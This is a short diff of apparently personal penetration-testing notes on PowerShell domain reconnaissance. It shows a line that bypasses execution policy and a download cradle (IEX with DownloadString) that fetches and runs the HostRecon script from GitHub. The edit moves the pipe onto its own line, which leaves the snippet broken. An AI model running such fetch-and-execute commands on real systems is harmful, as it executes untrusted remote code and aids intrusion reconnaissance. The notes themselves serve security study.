@@ -132,7 +132,8 @@ We can utilize some native PS components to gain an understanding of the domain
 Set-ExecutionPolicy bypass -Force
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1') 
-Invoke-HostRecon |Out-File recon.txt 
+Invoke-HostRecon 
+|Out-File recon.txt 
 ```
 
 ![](IMG-20231117230353006.png)
